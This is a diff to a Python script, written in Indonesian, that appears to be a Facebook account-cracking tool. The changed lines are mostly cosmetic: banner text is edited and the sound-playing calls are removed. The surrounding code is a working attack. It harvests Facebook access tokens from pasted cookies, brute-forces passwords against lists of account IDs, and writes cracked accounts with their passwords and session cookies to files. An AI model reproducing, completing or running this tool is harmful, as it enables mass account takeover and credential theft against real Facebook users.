@@ -328,14 +328,14 @@ def login_lagi334():
 	try:
 		os.system('clear')
 		banner()
-		cetak(nel('\tSARAN EXTENSION : [green]COOKIEDOUGH[white] 🍪'))
+		cetak(nel('\tSARAN EXTENSION : [green]COOKIEDOUGH[white]'))
 		asu = random.choice([m,k,h,b,u])
-		cookie=input(f'  [{h}•{x}] ├──MASUKKAN COOKIES :{asu} ')
+		cookie=input(f'  [{h}•{x}]MASUKKAN COOKIES :{asu} ')
 		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
 		find_token = re.search("(EAAG\w+)", data.text)
 		ken=open(".token.txt", "w").write(find_token.group(1));bot()
 		cok=open(".cok.txt", "w").write(cookie)
-		print(f'├── {x}[{h}•{x}]{h} LOGIN BERHASIL JALANKAN ULANG PERINTAHNYA !{x} ');time.sleep(1)
+		print(f'├──{x}[{h}•{x}]{h} LOGIN BERHASIL JALANKAN ULANG PERINTAHNYA !{x} ');time.sleep(1)
 		exit()
 	except Exception as e:
 		os.system("rm -f .token.txt")
@@ -353,7 +353,7 @@ def menu(my_name,my_id):
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
 	except IOError:
-		print('╠═[×] COOKIES KADALUARSA ')
+		print('├──[×] COOKIES KADALUARSA ')
 		time.sleep(5)
 		login_lagi334()
 	os.system('clear')
@@ -648,14 +648,14 @@ def passwrd():
 	if woi in ['y','Y']:
 		back()
 	else:
-		print(f'\t{x}[{k} ├──[SEE YOU NEXT TIME]{x}]')
+		print(f'\t{x}[{k}[SEE YOU NEXT TIME]{x}]')
 		time.sleep(2)
 		exit()
 #--------------------[ METODE-B-API ]-----------------#
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r├──{P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+	sys.stdout.write(f"\r├──{P}[{b}{loop}{P}][{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -674,7 +674,6 @@ def crack(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{x}├──{k} {idf}|{pw}{N}')     
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				os.popen('play-audio data/cp.mp3')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
@@ -686,7 +685,6 @@ def crack(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}├── {H}{idf}|{pw}|{kuki}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
-					os.popen('play-audio data/ok.mp3')
 					break
 				elif 'ya' in taplikasi:
 					coki=po.cookies.get_dict()
@@ -709,11 +707,9 @@ def crack(idf,pwv):
 					for muncul in apkexp:
 						hit+=1
 						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
-					print(f'\r{x}├── {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
-					os.popen('play-audio data/ok.mp3')
+					print(f'\r{x}├──{H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
 					ok+=1
 					break
-
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
